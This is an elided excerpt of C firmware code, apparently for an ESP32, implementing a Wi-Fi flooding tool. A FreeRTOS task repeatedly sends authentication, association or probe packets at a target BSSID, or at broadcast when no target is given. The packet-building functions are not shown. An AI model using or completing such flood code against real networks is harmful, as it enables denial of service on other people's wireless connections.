...
typedef enum { FLOOD_TYPE_AUTH, FLOOD_TYPE_ASSOC, FLOOD_TYPE_PROBE } flood_type_t;
...
static void flood_task(void *pvParameters) {
  ...
  while (is_running) {
    switch (g_type) {
      case FLOOD_TYPE_AUTH:
        send_auth_packet();
        break;
      case FLOOD_TYPE_ASSOC:
        send_assoc_packet();
        break;
      case FLOOD_TYPE_PROBE:
        send_probe_packet();
        break;
    }
...
static bool start_flood(const uint8_t *target_bssid, uint8_t channel, flood_type_t type) {
  ...
  if (target_bssid)
    memcpy(g_target, target_bssid, 6);
  else
    memset(g_target, 0xFF, 6);
  ...
  if (flood_task_stack && flood_task_tcb) {
    flood_task_handle = xTaskCreateStatic(
        flood_task, "wifi_flood", FLOOD_STACK_SIZE, NULL, 5, flood_task_stack, flood_task_tcb);
  }
